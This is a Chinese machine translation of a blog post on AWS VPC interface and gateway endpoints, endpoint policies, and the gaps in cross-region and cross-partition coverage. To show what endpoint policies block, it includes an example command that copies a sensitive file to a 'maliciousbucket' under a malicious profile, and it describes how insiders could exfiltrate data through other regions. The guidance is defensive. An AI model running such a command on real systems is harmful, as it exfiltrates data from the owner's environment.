<html>
<head>
<title>What Exactly are VPC Endpoints and Why They Need Real Inter-Region Support</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">什么是VPC端点，为什么他们需要真正的跨地区支持</h1>
<blockquote>原文：<a href="https://itnext.io/what-exactly-are-vpc-endpoints-and-why-they-need-real-inter-region-support-283a9987fe51?source=collection_archive---------0-----------------------#2022-03-01">https://itnext.io/what-exactly-are-vpc-endpoints-and-why-they-need-real-inter-region-support-283a9987fe51?source=collection_archive---------0-----------------------#2022-03-01</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="04bd" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">AWS最容易被误解的特性之一是VPC端点。我觉得我必须每周解释一次他们实际上是如何工作的。此外，由于它们被如此误解，它们在客户环境中的使用不足已经到了犯罪的边缘。因此，让我们花一分钟时间来充分理解它们是什么以及为什么应该使用它们。</p><h1 id="3663" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">AWS API</h1><p id="7cfa" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">AWS API只是一堆HTTPS 443 TCP端点(当然也有一些显著的例外，它们使用不同的协议，比如SES和IOT，但是概念是一样的)。当您使用AWS SDK时——无论是AWS CLI、Python Boto3、AWS SDK for JS，还是它们中的任何一个——该SDK本质上都是在执行HTTPS请求。例如，当你跑步时</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="3d56" class="ma kp it lw b gy mb mc l md me">aws rds describe-db-instances --region us-east-1</span></pre><p id="1ff3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">CLI向rds.us-east-1.amazonaws.com发送包含您的IAM信息的DescribeDbInstances API操作的HTTPS请求，以对该请求进行身份验证。为了找到向其发送请求的正确IP，CLI还必须对rds.us-east-1.amazonaws.com进行DNS查找。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="a285" class="ma kp it lw b gy mb mc l md me">matthew@Matthews-MBP-2 Documents % nslookup rds.us-east-1.amazonaws.com<br/>Server:  192.168.1.1<br/>Address: 192.168.1.1#53<br/><br/>Non-authoritative answer:<br/>Name:    rds.us-east-1.amazonaws.com<br/>Address: 54.239.31.3</span></pre><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div class="gh gi mf"><img src="../Images/1394b66c277caecd5cbf2478be8c5bc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1042/format:webp/1*yYXoI30sWM7owcfGepogWA.jpeg"/></div><figcaption class="mj mk gj gh gi ml mm bd b be z dk translated">这是默认的流量流，无论客户端是在VPC还是在家里的笔记本电脑上。在VPC内部，这将需要一个互联网网关，或许还需要一个NAT GW。</figcaption></figure><p id="9541" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">然而，允许通过互联网的流量有4个问题:</p><ol class=""><li id="9b52" class="mn mo it js b jt ju jx jy kb mp kf mq kj mr kn ms mt mu mv bi translated">需要出站防火墙规则，例如IP允许列表、域允许列表，这可能会很麻烦。如果你想让他们出去，你必须事先知道这些域名和IP地址。调试和正确实现这一点非常耗时，而且会让人发疯。</li><li id="fed3" class="mn mo it js b jt mw jx mx kb my kf mz kj na kn ms mt mu mv bi translated">出口数据费用——如果你使用的是托管NAT GW，AWS会向你收取出口流量的数据处理费用，这对S3来说尤其昂贵(如果Corey Quinn发现了这篇文章，他会使劲点头)</li><li id="4037" class="mn mo it js b jt mw jx mx kb my kf mz kj na kn ms mt mu mv bi translated">延迟——如果在该地区持续存在，这可能不是一个大问题，但通过公共互联网链路的流量几乎总是比通过MPLS或其他方式的私有路由的流量慢。* *一些读者联系我，表示VPC端点不一定会减少AWS服务的延迟，有时似乎会增加延迟。这不是我的经验，但我觉得必须更新。有很多因素会影响延迟，尽管我倾向于相信大多数情况下VPC端点至少会略微改善延迟。</li><li id="1e09" class="mn mo it js b jt mw jx mx kb my kf mz kj na kn ms mt mu mv bi translated">细粒度的访问控制。AWS SDKs通常内置有自己独立的证书信任存储(它们可能不使用本地操作系统的信任存储)。许多NGFWs能够解密出站TLS流量，Palo Alto将此称为SSL转发代理，其中Palo Alto终止VPC资源之间的出站TLS，并作为中间人在应用层检查之前加密的流量。这需要信任防火墙使用的证书链。这增加了额外的管理开销，还需要防火墙中一些复杂的规则来控制对AWS APIs的网络访问。出于这些原因，AWS域经常被排除在出站解密之外。</li></ol><p id="507c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">为了帮助客户解决上述难题，AWS允许您创建VPC端点。必须指出，VPC端点是严格的网络结构。人们通常会认为VPC端点无法工作，因为他们试图访问另一个AWS帐户中的资源——但这是不正确的！端点只是改变请求到达服务API的网络路径。</p><p id="85de" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">以下示例假设您在美国东部1区工作。我们将在之后讨论地区间的分歧。</p><h1 id="bd20" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">界面端点</h1><p id="bc24" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">为了混淆视听，有两种类型的VPC端点。第一个是接口端点。</p><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/46baba16bcc091932f47ac2e91c58234.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*LltyGq08D0WgtHnITmHDHQ.jpeg"/></div><figcaption class="mj mk gj gh gi ml mm bd b be z dk translated">当您创建RDS VPC端点时，它会在rds.us-east-1.amazonaws.com的不可见Route 53私有托管区域中创建一个记录，并将其指向您的端点的IP地址。这样，去往rds.us-east-1.amazonaws.com的所有VPC流量都将去往私有端点，而不是公共IP。</figcaption></figure><p id="d281" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">人们最难理解的是域名系统，因为AWS对此的解释总是很随意。要使上面的图表起作用，必须启用三样东西:</p><ol class=""><li id="9b81" class="mn mo it js b jt ju jx jy kb mp kf mq kj mr kn ms mt mu mv bi translated">在您的VPC中启用DNS主机名—这将创建和管理一个不可见的Route 53私有托管区域。我更希望这是可见的，并设置为只读，因为它真的会清除一些人开始混淆。例如，EC2实例的私有主机名位于这个区域中。</li></ol><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/63804cbabf6ec1708f59fd175eafe7c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TsR28g4f1QQn6vrLJosrbQ.png"/></div></div></figure><p id="cd62" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">2.启用DNS解析。这将启用VPC分解器，它始终位于VPC CIDR的+2处。如果你的VPC·CIDR是10.244.0.0/16。R53递归解析器的IP地址是10.244.0.2。启用此功能:我们现在可以在不可见的私有托管区域中查找我们私有IP地址的DNS记录。</p><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nh"><img src="../Images/a460c1769354b7e10a3300752a038091.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HnyvBwiuKi7gbrf1P3Bi2A.png"/></div></div></figure><p id="566e" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">3.在VPC端点上启用DNS名称。这将为myregion.amazonaws.com创建一个区域，为服务创建一个记录，并将其与您的VPC相关联，因此它将覆盖您尝试访问的AWS服务的公共DNS。它将使您的VPC资源解析您正在创建的端点的私有IP，而不是公共端点。如果您正在为单个服务创建多个接口端点(下面将详细介绍为什么要这样做)，您应该在“默认”端点上启用它。请注意，下图中的描述有点误导，因为您的VPC没有“DNS支持”这种东西，他们指的是DNS解析。</p><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ni"><img src="../Images/8ad3ff07d4def5df86ea2fda7d975bde.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bN4m7h73aD1blg2DN1F5Sw.png"/></div></div></figure><p id="8333" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在，当我创建我的RDS端点时，它现在解析为我的VPC中的端点。</p><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nj"><img src="../Images/0ff54614341cb82cb5cc13680cc17c2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xZQdDIntVs_HS49S_39_WA.png"/></div></div></figure><p id="1fd0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">从这个VPC到rds.us-east-1.amazonaws.com的所有API调用都将转到这个端点。</p><h1 id="fdc3" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">网关端点</h1><p id="e854" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">上面我们看到了接口端点，这本质上是一个“DNS黑客”。对于S3和DynamoDB，它们需要网关端点作为“路由黑客”。(由于网关端点的一些限制，S3现在支持接口端点和网关端点)。从历史上看，网关端点类型是必要的，因为这些服务下的网络是不同的。</p><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nk"><img src="../Images/fe42dc6d2857e531335cb6407938d134.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aK-YlDBbsY-IaIymOhjPDw.jpeg"/></div></div></figure><p id="3ffe" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">检查路由表，有3个条目:本地VPC路由、到IGW的默认路由和到VPC端点的路由。pl-63a5400a是一个前缀列表，它列出了与特定服务相关的IP范围，在本例中是us-east-1中的S3。没有DNS更改，因为AWS知道S3的IP地址，他们说只要将此条目添加到您的路由表中，任何去往与S3相关联的CIDR块的流量都将被路由到VPC端点。DNS没有更新。每当您的SDK调用S3 API时，它将查找s3.us-east-1.amazonaws.com，并且它将总是获得以下所示范围内的IP地址响应(无论网关端点是否存在)，这些响应与前缀列表相关联，从而导致VPC路由器适当地路由流量。</p><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nl"><img src="../Images/c94e3ceea8194015c1afa1eceb959c33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hX9jKeoPLSrxstL_luKR8A.png"/></div></div></figure><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="41e7" class="ma kp it lw b gy mb mc l md me">curl <a class="ae nm" href="https://ip-ranges.amazonaws.com/ip-ranges.json" rel="noopener ugc nofollow" target="_blank">https://ip-ranges.amazonaws.com/ip-ranges.json</a> | jq -r ‘.prefixes[] | select(.region==”us-east-1") | select(.service==”S3") | .ip_prefix’</span></pre><p id="fd65" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">发往S3 IP前缀列表内CIDR块的所有流量都将经过S3端点。</p><h1 id="d228" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">端点策略</h1><p id="f45c" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">由于您的AWS API调用不再通过互联网进行，因此绕过了您的防火墙，AWS为您提供了在您的策略上强制执行哪些API操作是允许的、哪些IAM主体是允许的、哪些资源是允许的等能力。这符合“零信任”原则——或者用我尊敬的同事埃德·本德(Ed Bender)的话来说，就是“腰带和吊带”。考虑下图:</p><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nk"><img src="../Images/3a384cb3f114c63bf61132cbfd946afa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_nN9gwWd5ltdfoK2qaRiPA.jpeg"/></div></div></figure><p id="644b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">即使我们将s3FullAccess IAM策略应用于s3-read-access IAM角色，只要它在使用所示策略将S3流量路由到VPC端点的子网内使用，它就永远无法执行aws s3 ls s3://mybucket，因为端点策略只允许s3://yourbucket上的ListBucket。</p><p id="00a2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">由于您可以将不同的策略与不同的端点相关联，因此您通常会看到多个端点，并使用所需的端点配置不同子网的路由表。</p><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nn"><img src="../Images/5aafb5cf2f96fb1ccdd0b06dca48b28f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TkdOOS_4UtFSEH343aR8Tw.jpeg"/></div></div></figure><p id="532a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">或者，如果您使用的是接口端点，则可以指定向其发送HTTPS请求的端点。其中“默认”端点是在DNS中注册的端点。下面指定的端点将具有允许该请求的必要端点策略，而默认端点将阻止该请求。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="8855" class="ma kp it lw b gy mb mc l md me">aws ec2 describe-instances --endpoint-url https://172.31.0.33</span></pre><figure class="lr ls lt lu gt mg gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/8e467ee8217d911c3ea9ad70022917b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*r4NFLV_sF7ntKJ6eeEGigA.jpeg"/></div></figure><p id="5259" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我建议对您的所有端点使用VPC端点策略。它们通过强制执行授权流量来改善您的安全状况，尤其是在涉及恶意内部人员时。如果有人获得了对VPC资源的外壳访问权，并从他们自己的AWS帐户引入凭证，则具有正确配置的策略的VPC端点可以阻止这些凭证被使用。即使<em class="no">恶意</em>配置文件在IAM中有适当的访问权限，下面的命令也会失败</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="ae46" class="ma kp it lw b gy mb mc l md me">aws s3 cp ./sensitivefile s3://maliciousbucket --profile malicious</span></pre><p id="1a8b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在设计您的VPC端点架构时，理解您的用例及架构尤为重要。没有放之四海而皆准的方法。不要过分为每个API动作创建端点。具有复杂策略的共享终端是完全可以接受的，只要该设计能够适应您的威胁模型。</p><h1 id="a6cd" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">区域间的流量呢？</h1><p id="ff9b" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">您现在可能已经注意到，在上述每个场景中，我们都在一个地区工作，即us-east-1。如果您想从区域B中的VPC访问区域A中的资源，会发生什么情况呢？它的关键是你可以，但除非你想让它通过互联网，你必须配置类似这里概述的参考架构<a class="ae nm" href="https://hands-on.cloud/automating-access-to-multi-region-vpc-endpoints-using-terraform/" rel="noopener ugc nofollow" target="_blank">https://hands-on . cloud/automating-access-to-multi-region-VPC-endpoints-using-terraform/</a>。这利用了DNS转发规则，允许您通过私有通道利用跨区域API。然而，由于它的复杂性和范围限制，它并不理想；它要求每个区域都有一个DNS转发规则，每个区域都有一个VPC端点，并且每个区域都有一个正确配置的策略。这增加了大量额外的管理开销，尤其是如果您在其他区域没有VPC工作负载的话。最后但并非最不重要的是，如果你没有一个特定地区的DNS转发规则，该流量仍将通过公共互联网。没有单一的包罗万象。恶意的内部人员仍然可以通过点击按钮将您的所有数据发送到他们拥有的另一个区域的bucket中。我估计这个漏洞在CVSS 3.1评分系统中最低为6分，但也可能高达8.2分。我将完整性影响和可用性影响标记为“无”,但可以说它们可能更高。以下是我对它的评分:</p><p id="b615" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><a class="ae nm" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N&amp;version=3.1" rel="noopener ugc nofollow" target="_blank">AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N</a></p><p id="bc69" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我倾向于在创建端点时指定多区域支持。Amazon已经在幕后控制该区域的DNS条目，为每个区域自动添加DNS记录是微不足道的。对于网关端点，他们已经知道他们所有的IP地址，为什么不更新前缀列表来包括所有区域的公共范围呢？S3跨区域复制以及VPC和TGW的跨区域对等网络的管道肯定是存在的。</p><p id="afdf" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">一个潜在的缓解措施是在您的出口安全组规则中添加特定的规则(如果您利用网关端点，您可以在安全组规则中引用前缀列表)。这将完全阻止对端点的网络访问。然而，EC2实例可能出于多种原因访问AWS之外的公共API:打补丁(是的，我知道WSUS和卫星回购服务器可以缓解)、安全更新(IDS/IPS、AV)、应用程序相关、容器映像等。有些情况下可能需要0.0.0.0/0出站规则。如果我使用VPC端点定义对AWS APIs的网络访问，似乎我应该能够使用端点策略明确地控制对它们的访问，而不必依赖其他组件。</p><h1 id="bd91" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated"><strong class="ak">…分区间呢？</strong></h1><p id="9d8e" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">对于那些不熟悉分区的人来说，AWS中有3个分区:商业(大多数人在那里操作)，GovCloud(一个完全独立的数据中心，已经被美国政府审计其敏感工作负载——想想国防部SRG IL-4/5，FedRAMP High，IRS 1075等。)，以及完全在中国运营并符合中国政府合规要求的AWS中国。它们本质上作为不同的区域运作，但也有完全唯一的身份边界；您不能在GovCloud中引用商业arn，反之亦然。因此，您不能让商业lambda使用IAM角色访问GovCloudS3 bucket，您必须使用访问键，并让Lambda在进行API调用时使用这些键。但目前，没有办法在分区之间使用VPC端点——所有的流量都将通过互联网——确保您对*.amazonaws.com子域名有默认的拒绝操作！如果没有这个，我可以利用与上面类似的攻击媒介。</p><h1 id="aefd" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">推荐</h1><p id="d771" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">将VPC端点用于您使用的API服务，甚至可能是少数您不使用的API服务(如DynamoDB、CloudWatch、Kinesis和S3)，目前没有包含所有服务的主端点——这在AWS用户的愿望清单上已经存在多年了。在高度敏感的工作负载中，对于以数据为中心的服务，如S3、DynamoDB、CloudWatch、Kinesis，有严格的拒绝流量的策略。这些服务能够将数据泄漏到您的环境之外。即使您没有使用Kinesis或DDB，在这些端点上使用“拒绝所有VPC端点”策略也会阻止任何网络流量流向这些端点。注意:IAM和SCPs不会涵盖这一点！如果我使用的是不同账户的I am信用，你就没有别的办法阻止我了！</p><p id="0314" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">如果您没有正确配置的端点，允许网络防火墙列出域，特别列出aws域肯定会有所帮助，但有时您可能需要制定更精确的策略。这里的关键始终是:像攻击者一样思考，什么地方会出问题。想一想一项服务或一项资源可以被以非设计的方式使用的方法。</p><h1 id="a2e1" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">《我的愿望》</h1><p id="c353" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">在一个完美的世界里，Amazon应该包括接口端点的所有分区服务子域和前缀列表的所有公共范围，并且在分区之间有一个默认的deny。换句话说，除非明确列入白名单，否则AWS API流量不可能在分区之间流动。如果您的GovCloud工作负载需要访问商业S3中的文件，请将其移动到GovCloud存储桶或添加到端点策略中。</p></div><div class="ab cl np nq hx nr" role="separator"><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu"/></div><div class="im in io ip iq"><p id="933b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">Matthew是领先的AWS网络安全合作伙伴stackArmor的高级解决方案总监，该公司为希望满足合规框架安全要求的客户设计定制解决方案:FedRAMP、NIST 800系列、PCI-DSS、国防部SRG、HIPAA、FISMA、FIPS 140–2(和3)等。StackArmor提供了一个经过AWS审核的解决方案，可以加速FedRAMP ATO的运行并降低40%以上的成本。</p></div></div>    
</body>
</html>